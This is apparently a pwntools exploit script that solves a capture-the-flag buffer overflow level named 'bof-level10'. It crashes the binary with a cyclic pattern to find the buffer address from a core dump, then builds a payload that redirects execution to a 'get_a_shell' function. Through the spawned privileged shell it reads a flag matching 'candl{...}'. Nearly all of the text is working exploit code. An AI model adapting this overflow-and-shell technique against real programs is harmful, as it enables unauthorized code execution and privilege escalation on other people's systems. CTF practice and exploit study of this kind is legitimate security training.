# SETUP BOILERPLATE
from pwn import *
import os

elf = ELF('./bof-level10') # replace this with the actual level
DEBUG = False # toggles gdb.debug or process

# crash the process to get a core file and find the buffer address (still boilerplate)
io = elf.process(env={}, setuid=False)
io.sendline(cyclic(10000)) # send 1000 junk characters
io.wait()
core = io.corefile
buffer_address = core.stack.find(cyclic(50))
os.unlink(core.path) # delete the file now that we're done with it

# launch the main process (still boilerplate)
if DEBUG:
    context.log_level = 'DEBUG'
    context.terminal = ['tmux', 'splitw', '-h']
    io = elf.debug(env={}, gdbscript="""
b *0x080485d3
continue
""")

else:
    io = elf.process(env={})


# END SETUP BOILERPLATE
# BEGIN CHALLENGE-SPECIFIC CODE
get_a_shell = p32(elf.symbols["get_a_shell"])

payload = cyclic(256).replace(b'gaab', p32(buffer_address + 4)).replace(b'aaaa', get_a_shell)
io.sendline(payload)


# END CHALLENGE-SPECIFIC CODE
# BEGIN FLAG RETRIEVAL BOILERPLATE

import re
io.sendlineafter(b'Spawning a privileged shell', b'cat flag')
flag = re.search(br'candl\{[ -z|~]*}', io.recvregex(br'candl\{[ -z|~]*}')).group(0)
print(flag)
